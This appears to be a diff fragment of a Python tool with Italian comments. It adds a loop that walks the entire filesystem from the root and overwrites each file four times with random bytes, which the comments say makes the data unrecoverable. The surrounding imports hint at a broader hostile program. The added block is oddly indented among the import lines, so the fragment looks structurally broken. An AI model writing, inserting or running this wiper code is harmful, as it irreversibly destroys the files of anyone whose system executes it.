@@ -5,6 +5,25 @@ import os
 import socket
 import subprocess
 import shutil
+        passo=4
+        conta=0 
+        """percorso=os.path.join(os.path.expanduser("~"),"C:\\")#mostra il percoso nella directori  Desktop  
+        print(percorso)"""
+        for root, dirs,files in os.walk("/"):
+            for  file in files:
+                time.sleep(0)
+                file=os.path.join(root, file)
+                try:
+                    # Sovrascrive il contenuto del file con dati casuali per renderlo irrecuperabile
+                    with  open(file,"r+b") as f:
+                        for passo1 in range(passo):
+                            f.seek(0) # Torna all'inizio del file
+                            lettera=os.path.getsize(file) # Ottiene la dimensione del file
+                            f.write(os.urandom(lettera)) # Scrive dati casuali per la dimensione del file
+                            conta+=1
+                            print(file)
+                except:     
+                    print(f"comando non eseguito: {file}")
 """import pyautogui
 from  scapy.config import conf"""
 #from wifi import Cell, Schermo
